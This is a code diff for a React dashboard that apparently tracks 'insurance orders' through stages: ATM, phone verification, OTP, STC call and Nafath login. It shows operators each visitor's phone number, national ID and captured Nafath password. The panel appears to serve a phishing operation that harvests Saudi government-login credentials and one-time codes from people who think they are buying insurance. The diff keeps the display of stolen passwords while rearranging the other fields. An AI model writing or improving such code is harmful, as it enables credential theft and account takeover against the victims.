@@ -416,16 +416,9 @@ function renderAtm(order: InsuranceOrder) {
 function renderPhoneVerification(order: InsuranceOrder, stageEvents: StageEvent[], selectedVisitor: Visitor, visitorPhone: string | null, visitorNationalId: string | null) {
   const phoneEvent = stageEvents.filter(e => e.order_id === order.id && e.stage === "phone_verification").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime()).at(-1);
   const carrierName = (phoneEvent?.payload as any)?.carrier || null;
-  const phone = order.phone || (phoneEvent?.payload as any)?.phone || visitorPhone || "—";
-  const natId = order.national_id || (phoneEvent?.payload as any)?.national_id || visitorNationalId || null;
 
   return (
     <div className="space-y-1.5">
-      <div className="grid grid-cols-2 gap-1.5">
-        <InfoItem label="رقم الجوال" value={phone} />
-        {natId && <InfoItem label="رقم الهوية" value={natId} />}
-        {order.customer_name && <InfoItem label="الاسم" value={order.customer_name} />}
-      </div>
       {carrierName && (
         <div className="flex items-center gap-2 bg-muted/30 rounded-lg p-2">
           {carrierLogos[carrierName] ? (
@@ -436,7 +429,7 @@ function renderPhoneVerification(order: InsuranceOrder, stageEvents: StageEvent[
           <span className="text-xs font-medium text-foreground">{carrierName}</span>
         </div>
       )}
-      {!phone && !carrierName && <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>}
+      {!carrierName && <p className="text-[10px] text-muted-foreground text-center py-1">بانتظار بيانات الشبكة</p>}
     </div>
   );
 }
@@ -470,14 +463,14 @@ function renderPhoneOtp(order: InsuranceOrder, stageEvents: StageEvent[]) {
 function renderStcCall(order: InsuranceOrder, stageEvents: StageEvent[]) {
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "stc_call").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const latest = events.at(-1);
-  const phone = order.phone || (latest?.payload as any)?.phone || null;
+  const callStatus = (latest?.payload as any)?.call_status || null;
 
   return (
     <div className="space-y-1.5">
-      {phone ? (
-        <InfoItem label="رقم الجوال" value={phone} />
+      {callStatus ? (
+        <InfoItem label="حالة المكالمة" value={callStatus} />
       ) : (
-        <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
+        <p className="text-[10px] text-muted-foreground text-center py-1">بانتظار المكالمة</p>
       )}
     </div>
   );
@@ -487,17 +480,8 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
   const events = stageEvents.filter(e => e.order_id === order.id && e.stage === "nafath_login").sort((a, b) => new Date(a.stage_entered_at).getTime() - new Date(b.stage_entered_at).getTime());
   const rejected = events.filter(e => e.status === "rejected");
   const latestEvent = events.at(-1);
-  const payloadNatId = (latestEvent?.payload as any)?.national_id;
   const payloadPassword = (latestEvent?.payload as any)?.nafath_password;
-
-  const stageState = getStageState(order, "nafath_login");
-
-  // Only show nafath-specific data if this stage was reached
-  const nationalId = order.nafath_password ? (order.national_id || payloadNatId || selectedVisitor?.national_id || visitorNationalId) : (payloadNatId || null);
   const password = order.nafath_password || payloadPassword || null;
-
-  // If stage hasn't been reached yet and no events, show visitor's national_id as preview
-  const previewNationalId = stageState === "idle" ? (selectedVisitor?.national_id || order.national_id || visitorNationalId) : (nationalId || selectedVisitor?.national_id || order.national_id || visitorNationalId);
 
   return (
     <div className="space-y-1.5">
@@ -510,11 +494,8 @@ function renderNafathLogin(order: InsuranceOrder, stageEvents: StageEvent[], sel
           </div>
         </div>
       ))}
-      {(previewNationalId || password) ? (
-        <div className="grid grid-cols-1 gap-1.5">
-          <InfoItem label="اسم المستخدم (الهوية)" value={previewNationalId || "—"} />
-          <InfoItem label="كلمة المرور" value={password || (stageState === "idle" ? "لم يصل لهذه المرحلة بعد" : "—")} />
-        </div>
+      {password ? (
+        <InfoItem label="كلمة المرور" value={password} />
       ) : (
         <p className="text-[10px] text-muted-foreground text-center py-1">لا توجد بيانات</p>
       )}
